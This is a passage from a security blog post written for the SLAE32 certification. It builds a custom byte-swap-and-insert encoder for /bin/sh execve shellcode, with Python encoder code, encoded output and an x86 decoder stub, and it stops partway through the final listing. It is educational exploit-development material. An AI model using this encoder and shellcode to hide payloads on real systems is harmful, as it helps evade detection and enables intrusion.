<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="SLAE32: Creation of custom encoding scheme" /><meta name="author" content="Travis Mathison" /><meta property="og:locale" content="en" /><meta name="description" content="The blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/ Student ID: SLAE-990" /><meta property="og:description" content="The blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/ Student ID: SLAE-990" /><link rel="canonical" href="https://tdmathison.github.io/posts/slae32-4/" /><meta property="og:url" content="https://tdmathison.github.io/posts/slae32-4/" /><meta property="og:site_name" content="Travis Mathison" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2018-01-19T11:00:00-08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="SLAE32: Creation of custom encoding scheme" /><meta name="twitter:site" content="@ciph34block" /><meta name="twitter:creator" content="@Travis Mathison" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"Travis Mathison"},"description":"The blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/ Student ID: SLAE-990","url":"https://tdmathison.github.io/posts/slae32-4/","@type":"BlogPosting","headline":"SLAE32: Creation of custom encoding scheme","dateModified":"2020-10-02T23:28:29-07:00","datePublished":"2018-01-19T11:00:00-08:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://tdmathison.github.io/posts/slae32-4/"},"@context":"https://schema.org"}</script><title>SLAE32: Creation of custom encoding scheme | Travis Mathison</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Travis Mathison"><meta name="application-name" content="Travis Mathison"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/profile.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Travis Mathison</a></div><div class="site-subtitle font-italic">Malware Reverse Engineering and Threat Research.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/resources/" class="nav-link"> <i class="fa-fw fas fa-book ml-xl-3 mr-xl-3 unloaded"></i> <span>RESOURCES</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/tdmathison" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/ciph34block" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a> <a href="https://www.linkedin.com/in/travismathison/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>SLAE32: Creation of custom encoding scheme</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>SLAE32: Creation of custom encoding scheme</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Travis Mathison </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, Jan 19, 2018, 11:00 AM -0800" >Jan 19, 2018<i class="unloaded">2018-01-19T11:00:00-08:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Fri, Oct 2, 2020, 11:28 PM -0700" >Oct 2, 2020<i class="unloaded">2020-10-02T23:28:29-07:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1896 words">10 min read</span></div></div><div class="post-content"><h3 id="the-blog-post-has-been-created-for-completing-the-requirements-of-the-securitytube-linux-assembly-expert-certification">The blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</h3><p><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a><br /> Student ID: SLAE-990</p><p>Assignment #4</p><hr /><h2 id="goals">Goals</h2><ul><li>Take a simple shellcode that uses execve to spawn /bin/sh and run it through a custom encoder<li>Explain the custom encoder and show it executing</ul><h2 id="what-is-an-encoder">What is an encoder?</h2><p>An encoder can be defined as an implementation of transforming data from one format to another using a publicly known scheme that can be reversed. That is, it is not a form of encryption but rather a way to compress or change the form of data. In this case, known shellcode will be mangled by both shifting bytes around and inserting bytes. Upon decoding the reverse will happen which will allow the shellcode to run again.</p><h2 id="the-shellcode-to-encode">The shellcode to encode</h2><p>The following shellcode will spawn /bin/sh when executed. This will be the basis of what we will encode with the custom encoder.</p><div class="language-nasm highlighter-rouge"><div class="code-header"> <span text-data=" Nasm "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="nf">global</span> <span class="nv">_start</span>			

<span class="nf">section</span> <span class="nv">.text</span>
<span class="nl">_start:</span>

	<span class="c1">; PUSH the first null dword</span>
	<span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
	<span class="nf">push</span> <span class="nb">eax</span>

	<span class="c1">; PUSH //bin/sh (8 bytes)</span>
	<span class="nf">push</span> <span class="mh">0x68732f2f</span>
	<span class="nf">push</span> <span class="mh">0x6e69622f</span>
	<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>
	<span class="nf">push</span> <span class="nb">eax</span>
	<span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">esp</span>
	<span class="nf">push</span> <span class="nb">ebx</span>
	<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>
	<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">11</span>
	<span class="nf">int</span> <span class="mh">0x80</span>
</pre></table></code></div></div><h2 id="the-custom-encoder">The custom encoder</h2><p><strong>SwapSert Encoder</strong> The idea of this encoder is that it will swap two adjacent bytes and then insert a byte. The inserted byte in this example will be 0x7f.</p><h3 id="encoding-phase">Encoding phase</h3><div class="table-wrapper"><table><thead><tr><th style="text-align: left">Step<th style="text-align: left">Sequence<th style="text-align: left">What is happening?<tbody><tr><td style="text-align: left">1<td style="text-align: left">\x41 \x42 \x43 \x44<td style="text-align: left">starting bytes<tr><td style="text-align: left">2<td style="text-align: left">\x42 \x41 \x7f \x43 \x44<td style="text-align: left">swap 1st/2nd bytes and insert byte<tr><td style="text-align: left">3<td style="text-align: left">\x42 \x41 \x7f \x44 \x43 \x7f<td style="text-align: left">swap 3rd/4th bytes and insert byte</table></div><h4 id="example-of-this-being-done-on-the-first-8-bytes-of-our-shellcode">Example of this being done on the first 8 bytes of our shellcode</h4><p><img data-proofer-ignore data-src="https://tdmathison.github.io/assets/img/slae32/04-01.png" /></p><p><strong>Python script to encode a byte array</strong></p><div class="language-python highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python
</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f</span><span class="s">"</span> \
            <span class="sa">b</span><span class="s">"</span><span class="se">\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89</span><span class="s">"</span> \
            <span class="sa">b</span><span class="s">"</span><span class="se">\xe1\xb0\x0b\xcd\x80</span><span class="s">"</span>
<span class="n">encoded</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">encoded2</span> <span class="o">=</span> <span class="s">""</span>

<span class="k">print</span><span class="p">(</span><span class="s">'Encoded shellcode ...'</span><span class="p">)</span>

<span class="n">pos</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">insert_byte</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x7f</span><span class="s">"</span>
<span class="k">while</span> <span class="p">(</span><span class="n">pos</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">):</span>
    <span class="n">encoded</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\\</span><span class="s">x%02x</span><span class="se">\\</span><span class="s">x%02x</span><span class="se">\\</span><span class="s">x%02x"</span>
		<span class="o">%</span> <span class="p">(</span><span class="n">shellcode</span><span class="p">[</span><span class="n">pos</span><span class="o">+</span><span class="mi">1</span><span class="p">],</span> <span class="n">shellcode</span><span class="p">[</span><span class="n">pos</span><span class="p">],</span> <span class="n">insert_byte</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="n">encoded2</span> <span class="o">+=</span> <span class="s">"0x%02x,0x%02x,0x%02x,"</span>
		<span class="o">%</span> <span class="p">(</span><span class="n">shellcode</span><span class="p">[</span><span class="n">pos</span><span class="o">+</span><span class="mi">1</span><span class="p">],</span> <span class="n">shellcode</span><span class="p">[</span><span class="n">pos</span><span class="p">],</span> <span class="n">insert_byte</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="n">pos</span> <span class="o">+=</span> <span class="mi">2</span>

<span class="k">if</span> <span class="ow">not</span> <span class="n">pos</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">):</span>
    <span class="n">encoded</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\\</span><span class="s">x%02x</span><span class="se">\\</span><span class="s">x%02x</span><span class="se">\\</span><span class="s">x%02x"</span>
		<span class="o">%</span> <span class="p">(</span><span class="n">insert_byte</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">shellcode</span><span class="p">[</span><span class="n">pos</span><span class="p">],</span> <span class="n">insert_byte</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="n">encoded2</span> <span class="o">+=</span> <span class="s">"0x%02x,0x%02x,0x%02x"</span>
		<span class="o">%</span> <span class="p">(</span><span class="n">insert_byte</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">shellcode</span><span class="p">[</span><span class="n">pos</span><span class="p">],</span> <span class="n">insert_byte</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>

<span class="k">print</span><span class="p">(</span><span class="s">"Original: </span><span class="se">\"</span><span class="s">"</span> <span class="o">+</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="s">'</span><span class="se">\\</span><span class="s">x%02x'</span> <span class="o">%</span> <span class="n">x</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">))</span> <span class="o">+</span> <span class="s">"</span><span class="se">\"</span><span class="s">"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Format1: </span><span class="se">\"</span><span class="s">"</span> <span class="o">+</span> <span class="n">encoded</span> <span class="o">+</span> <span class="s">"</span><span class="se">\"</span><span class="s">"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Format2: "</span> <span class="o">+</span> <span class="n">encoded2</span><span class="p">)</span>

</pre></table></code></div></div><h4 id="encoding-the-shellcode-with-the-python-script">Encoding the shellcode with the python script</h4><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="o">[</span>sengen@manjaro-x86 assignment4]<span class="nv">$ </span>python3 swapsert-encoder.py
Encoded shellcode ...
Original: <span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e2</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>

Format1: <span class="s2">"</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">e2</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">7f"</span>
Format2: 0xc0,0x31,0x7f,0x68,0x50,0x7f,0x2f,0x2f,0x7f,0x68,0x73,0x7f,0x2f,0x68,0x7f,0x69,0x62,0x7f,0x89,0x6e,0x7f,0x50,0xe3,0x7f,0xe2,0x89,0x7f,0x89,0x53,0x7f,0xb0,0xe1,0x7f,0xcd,0x0b,0x7f,0x7f,0x80,0x7f
</pre></table></code></div></div><h3 id="decoding-phase">Decoding phase</h3><div class="table-wrapper"><table><thead><tr><th style="text-align: left">Step<th style="text-align: left">Sequence<th style="text-align: left">What is happening?<tbody><tr><td style="text-align: left">1<td style="text-align: left">\x42 \x41 \x7f \x44 \x 43 \x7f<td style="text-align: left">starting encoded bytes<tr><td style="text-align: left">2<td style="text-align: left">\x41 \x42 \x44 \x43 \x7f<td style="text-align: left">swap 1st&amp;2nd bytes and remove byte<tr><td style="text-align: left">3<td style="text-align: left">\x41 \x42 \x43 \x44<td style="text-align: left">swap 3rd/4th bytes and remove byte</table></div><p>The decoder will acquire a reference to the location of the encoded bytes and perform the reverse actions to transform it back to executable shellcode. To perform this task I started will a skeleton assembly file setup to perform a JMP/CALL/POP so I have the address of the encoded shellcode.</p><div class="language-nasm highlighter-rouge"><div class="code-header"> <span text-data=" Nasm "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="nf">global</span> <span class="nv">_start</span>			

<span class="nf">section</span> <span class="nv">.text</span>
<span class="nl">_start:</span>
	<span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">call_shellcode</span>

<span class="nl">decoder:</span>
	<span class="nf">pop</span> <span class="nb">esi</span>

<span class="nl">decode:</span>

	<span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">EncodedShellcode</span>

<span class="nl">call_shellcode:</span>
	<span class="nf">call</span> <span class="nv">decoder</span>
	<span class="nl">EncodedShellcode:</span> <span class="kd">db</span> <span class="mh">0xc0</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x2f</span><span class="p">,</span><span class="mh">0x2f</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x2f</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x69</span><span class="p">,</span><span class="mh">0x62</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0x6e</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="mh">0xe3</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0xe2</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0xb0</span><span class="p">,</span><span class="mh">0xe1</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0xcd</span><span class="p">,</span><span class="mh">0x0b</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x80</span><span class="p">,</span><span class="mh">0x7f</span>
</pre></table></code></div></div><p>The process of decoding requires a few things to be tracked: the current location of the last decoded byte, how far out the next set of bytes to grab is, and finally testing 3 bytes ahead for another \x7f byte.</p><p><i>NOTE: If by chance the shellcode is done and the next insert byte check happens to run into a \x7f that is not part of the shellcode it would continue to swap bytes. Low chance, but it could happen. That said, it would not stop the shell from spawning on us and would only matter if the shellcode was back-to-back with additional instructions we needed to execute after the shell was spawned.</i></p><h3 id="setting-up-registers-and-initial-values">Setting up registers and initial values</h3><p>The first part of our shellcode will save a pointer to the first byte of our encoded shellcode. Since we are performing a JMP/CALL/POP we’ll be able to POP the memory location of the array of bytes we’ll be working with without having to know it’s address beforehand.</p><p>EAX/EBX/ECX/EDX are all zeroed out as they will be used for swapping each pair of bytes and for tracking the offset where bytes are to be swapped into next.</p><div class="language-nasm highlighter-rouge"><div class="code-header"> <span text-data=" Nasm "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nl">decoder:</span>
	<span class="nf">pop</span> <span class="nb">esi</span>			<span class="c1">; save location of encoded shellcode</span>
	<span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">ebx</span>		<span class="c1">; zero out ebx - used for swapping</span>
	<span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span><span class="nb">ecx</span>		<span class="c1">; zero out ecx - insert byte tracking</span>
	<span class="nf">mul</span> <span class="nb">ecx</span>			<span class="c1">; zero out EAX/EDX - used for swapping</span>
	<span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span><span class="nb">esi</span>		<span class="c1">; save encoded shellcode location into edi</span>
	<span class="nf">mov</span> <span class="nb">cl</span><span class="p">,</span><span class="mi">2</span>		<span class="c1">; location of next expected insert byte</span>
</pre></table></code></div></div><h3 id="decode-loop">Decode loop</h3><p>Now we are in the decoding loop where we’ll continue to swap bytes and overshift 0x7f bytes. Our first check will be to determine whether we have a 0x7f byte in the next predetermined location indicating we should perform another swap. If we don’t see it there we’ll conclude that we are done swapping and we should exit the loop.</p><div class="language-nasm highlighter-rouge"><div class="code-header"> <span text-data=" Nasm "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nf">cmp</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="nb">ecx</span><span class="p">],</span> <span class="mh">0x7f</span>	<span class="c1">; should another swap occur?</span>
<span class="nf">jne</span> <span class="nv">done</span>					<span class="c1">; jump out of loop</span>
</pre></table></code></div></div><p>Next, we perform a swap. We can’t swap the bytes between memory locations so we save each byte to a register and then save the register value back to opposite memory locations for perform the swap. ECX is tracking the location further ahead where the 0x7f byte is at and the two bytes to swap will always be the two bytes behind it.</p><div class="language-nasm highlighter-rouge"><div class="code-header"> <span text-data=" Nasm "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="nb">ecx</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span>			<span class="c1">; save first byte in pair</span>
<span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="nb">ecx</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>			<span class="c1">; save second byte in pair</span>
<span class="nf">mov</span> <span class="p">[</span><span class="nb">edi</span><span class="p">],</span> <span class="nb">bl</span>				<span class="c1">; swap byte</span>
<span class="nf">mov</span> <span class="p">[</span><span class="nb">edi</span><span class="o">+</span><span class="mi">1</span><span class="p">],</span> <span class="nb">al</span>				<span class="c1">; swap byte</span>
</pre></table></code></div></div><p>Finally, we adjust the offset of where the next 0x7f byte is expected and update the memory offset of where we would swap the bytes to. We then jump to the beginning of the loop where we test for the existence of the expected 0x7f byte.</p><div class="language-nasm highlighter-rouge"><div class="code-header"> <span text-data=" Nasm "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nf">add</span> <span class="nb">ecx</span><span class="p">,</span> <span class="mi">3</span>				<span class="c1">; the next 0x7f byte should be 3 bytes ahead</span>
<span class="nf">add</span> <span class="nb">edi</span><span class="p">,</span> <span class="mi">2</span>				<span class="c1">; memory offset for next swap save</span>
<span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">decode</span>			<span class="c1">; jump back to the beginning of the loop</span>
</pre></table></code></div></div><h3 id="completed-decoder-in-x86-assembly">Completed decoder in x86 assembly</h3><div class="language-nasm highlighter-rouge"><div class="code-header"> <span text-data=" Nasm "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre><span class="nf">global</span> <span class="nv">_start</span>			

<span class="nf">section</span> <span class="nv">.text</span>
<span class="nl">_start:</span>
	<span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">call_shellcode</span>

<span class="nl">decoder:</span>
	<span class="nf">pop</span> <span class="nb">esi</span>				<span class="c1">; save location of encoded shellcode</span>
	<span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">ebx</span>			<span class="c1">; zero out ebx - used for swapping</span>
	<span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span><span class="nb">ecx</span>			<span class="c1">; zero out ecx - insert byte tracking</span>
	<span class="nf">mul</span> <span class="nb">ecx</span>				<span class="c1">; zero out EAX/EDX - used for swapping</span>
	<span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span><span class="nb">esi</span>			<span class="c1">; save encoded shellcode location into edi</span>
	<span class="nf">mov</span> <span class="nb">cl</span><span class="p">,</span><span class="mi">2</span>			<span class="c1">; location of next expected insert byte</span>

<span class="nl">decode:</span>
	<span class="nf">cmp</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="nb">ecx</span><span class="p">],</span> <span class="mh">0x7f</span>	<span class="c1">; should another swap occur?</span>
	<span class="nf">jne</span> <span class="nv">done</span>			<span class="c1">; jump out of loop</span>
	<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="nb">ecx</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span>		<span class="c1">; save first byte in pair</span>
